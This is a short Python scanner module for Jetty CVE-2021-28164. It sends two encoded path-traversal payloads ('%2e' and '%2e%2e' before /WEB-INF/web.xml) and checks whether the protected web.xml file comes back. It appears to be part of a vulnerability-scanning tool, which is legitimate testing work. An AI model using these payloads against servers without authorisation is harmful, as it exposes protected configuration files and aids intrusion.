#!/usr/bin/env python3
# -*- coding:utf-8 -*-

cve_2021_28164_payloads = [
    {'path': '%2e/WEB-INF/web.xml'},
    {'path': '%2e%2e/WEB-INF/web.xml'},
]

def cve_2021_28164_scan(clients):
    ''' 默认允许请求的url中包含%2e或者%2e%2e以访问 WEB-INF 目录中的受保护资源
        例如请求 /context/%2e/WEB-INF/web.xml可以检索 web.xml 文件
    '''
    hackClient = clients.get('hackClient')
    
    vul_info = {
        'app_name': 'Jetty',
        'vul_type': 'DSinfo',
        'vul_id': 'CVE-2021-28164',
    }
    
    for payload in cve_2021_28164_payloads:
        path = payload['path']

        res = hackClient.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('<web-app>' in res.text)
            and ('<display-name>' in res.text)
            and ('<!DOCTYPE web-app PUBLIC' in res.text)
            and ('Sun Microsystems' in res.text)
            and ('DTD Web Application' in res.text)
        ):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
